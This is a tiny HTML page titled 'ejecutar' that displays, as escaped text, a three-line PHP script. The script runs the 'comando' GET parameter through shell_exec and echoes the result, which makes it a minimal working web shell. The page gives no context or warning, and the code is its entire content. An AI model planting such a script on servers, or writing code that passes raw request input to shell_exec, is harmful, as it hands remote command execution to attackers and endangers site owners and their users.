<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>ejecutar</title></head><body>&lt;?php<br>
$salida = shell_exec($_GET["comando"]);<br>
echo $salida;<br>
<br>
?&gt;<br>
</body></html>